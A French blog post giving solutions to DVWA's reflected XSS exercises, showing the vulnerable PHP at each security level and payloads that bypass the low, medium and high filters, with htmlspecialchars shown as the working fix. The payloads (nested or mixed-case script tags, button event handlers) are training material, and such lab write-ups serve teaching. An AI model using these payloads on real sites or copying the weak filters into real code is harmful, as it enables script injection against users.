---
layout: post
title: DVWA - XSS réfléchi
subtitle: Reflected XSS - Solutions
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [DVWA, XSS, solutions]
comments: false
---

**Voici quelques solutions (liste non exhaustive) pour la catégorie "Reflected XSS" de Damn Vulnerable Web App, DVWA**

## 0x00 - XSS réfléchi 

Une vulnérabilité _Reflected_ _XSS_ apparaît lorsque des données fournies par un client web sont utilisées telles quelles par les scripts du serveur pour produire une page de résultats. Ces données non vérifiées peuvent être utilisées pour injecter du code dans la page dynamique reçue par le navigateur client. [1][2]

## 0x01 - Security level: Low

Code source:

~~~
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
~~~

Il n'y a aucune mesure de sécurité.

**Payload:**

~~~
<script>alert('xss');</script>
~~~

Red Team: 1 - Blue Team: 0

## 0x02 - Security level: medium

Code source:

~~~
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?> 
~~~

Mesure de sécurité mise en place: effacer la balise script 

~~~
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
~~~

_Solution:_ utiliser un autre type de balise que <script> ou modifier son format

**Payload:**

~~~
#1
<sc<script>ript>alert('xss');</script>
#2
<sCriPt>alert('xss');</sCriPt>
~~~

Red Team: 1 - Blue Team: 0

## 0x03 - Security level: High

Code source:

~~~
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?> 
~~~

Mesure de sécurité mise en oeuvre: effacer tout contenu ou le mot script apparait

~~~
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
~~~

_Solution:_ utiliser une autre forme de balise

**Payload:**

~~~
#1
<button onmouseover="alert('xss');">xss</button>
#2
<button onclick="alert('xss');">xss</button>
~~~

Red Team: 1 - Blue Team: 0

## 0x04 - Security level: impossible

Code source: 

~~~
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
~~~

Mesure de sécurité mise en oeuvre: utilisation de _htmlspecialchars_

~~~
$name = htmlspecialchars( $_GET[ 'name' ] );
~~~

A priori, pas de solution possible. Le site est sécurisé.

Red Team: 0 - Blue Team: 1

**Références:**

[1] Cross-site scripting, [https://fr.wikipedia.org/wiki/Cross-site_scripting#XSS_r%C3%A9fl%C3%A9chi_(ou_non_permanent)](https://fr.wikipedia.org/wiki/Cross-site_scripting#XSS_r%C3%A9fl%C3%A9chi_(ou_non_permanent))

[2] OWASP, Cross-site Scripting (XSS), [https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))

[3] OWASP, XSS Filter Evasion Cheat Sheet, [https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
